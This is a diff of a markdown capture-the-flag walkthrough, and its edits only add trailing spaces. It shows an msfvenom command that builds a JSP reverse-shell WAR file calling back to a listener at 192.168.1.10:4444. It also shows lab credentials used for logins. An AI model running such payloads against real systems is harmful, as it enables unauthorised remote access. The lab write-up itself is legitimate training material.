@@ -101,15 +101,15 @@ we can generate the WAR file using msfvenom\
 msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f war > backdoor.war\
 
 you can see a /backdoor in the home page\
-click on it ,and you will get a reverse shell\
-i am using penelope for listening (since it auto upgrades into a stable shell)\
+click on it ,and you will get a reverse shell \
+i am using penelope for listening (since it auto upgrades into a stable shell) \
 
-<img width="837" height="187" alt="image" src="https://github.com/user-attachments/assets/2551c2a6-b6e8-43f9-be43-391b39fc7598" />\
+<img width="837" height="187" alt="image" src="https://github.com/user-attachments/assets/2551c2a6-b6e8-43f9-be43-391b39fc7598" /> \
 
-after enumerating a bit , we login as qiu , using the creds  qiu:password\
+after enumerating a bit , we login as qiu , using the creds  qiu:password \
 
-after some enum , we find a local.txt file at root\
-<img width="252" height="34" alt="image" src="https://github.com/user-attachments/assets/5107f3f1-cd07-4506-bee0-1eef4e3a1dec" />\
+after some enum , we find a local.txt file at root \
+<img width="252" height="34" alt="image" src="https://github.com/user-attachments/assets/5107f3f1-cd07-4506-bee0-1eef4e3a1dec" /> \
 
 then i realise , we can change to user fluffy with fluffy:freakishfluffybunny\
 
